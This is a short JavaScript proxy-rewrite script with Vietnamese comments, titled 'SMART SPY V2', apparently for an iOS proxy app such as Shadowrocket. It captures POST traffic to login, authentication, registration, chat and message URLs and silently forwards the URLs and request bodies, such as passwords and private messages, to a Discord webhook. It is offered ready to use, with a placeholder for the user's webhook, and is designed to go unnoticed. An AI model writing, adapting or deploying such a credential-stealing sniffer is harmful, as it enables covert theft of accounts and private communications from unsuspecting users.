/**
 * SMART SPY V2 - CHỈ BẮT LOGIN & TIN NHẮN
 * Tác giả: TungTinTacKMA (Updated)
 */

var url = $request.url;
var body = $request.body;
var method = $request.method;

// 1. DANH SÁCH BỎ QUA (RÁC)
// Nếu link chứa đuôi ảnh, nhạc, font, css... -> Bỏ qua ngay lập tức để game load nhanh
if (url.match(/\.(jpeg|jpg|png|gif|webp|svg|css|js|woff|woff2|ttf|mp3|wasm)$/i)) {
    $done({});
} 
// 2. CHỈ BẮT CÁC GÓI TIN QUAN TRỌNG
// Chỉ lấy nếu là phương thức POST (gửi dữ liệu) VÀ chứa từ khóa nhạy cảm
else if (method === "POST" && (
    url.includes("login") ||       // Bắt đăng nhập
    url.includes("auth") ||        // Bắt xác thực
    url.includes("chat") ||        // Bắt tin nhắn
    url.includes("message") ||     // Bắt tin nhắn
    url.includes("register")       // Bắt đăng ký
)) {
    sendToDiscord(url, body);
    $done({}); // Cho phép gói tin đi tiếp ngay để không bị lag game
} 
// 3. CÁC LINK KHÁC -> BỎ QUA
else {
    $done({});
}

function sendToDiscord(targetUrl, capturedData) {
    // Thay WEBHOOK_URL của bạn vào đây
    var discordUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"; 
    
    var data = {
        "username": "Shadow Hunter",
        "avatar_url": "https://i.imgur.com/4M34hi2.png",
        "embeds": [{
            "title": "🎯 ĐÃ BẮT ĐƯỢC MỤC TIÊU!",
            "color": 16711680,
            "fields": [
                {
                    "name": "🌐 Đang truy cập:",
                    "value": "`" + targetUrl + "`"
                },
                {
                    "name": "🔑 Dữ liệu thu được:",
                    "value": "```json\n" + capturedData + "\n```"
                }
            ],
            "footer": {
                "text": "Shadowrocket Sniffer | Time: " + new Date().toLocaleTimeString()
            }
        }]
    };

    $task.fetch({
        url: discordUrl,
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }, function(error, response, data) {
        // Gửi ngầm, không cần log ra console để tránh spam
    });
}
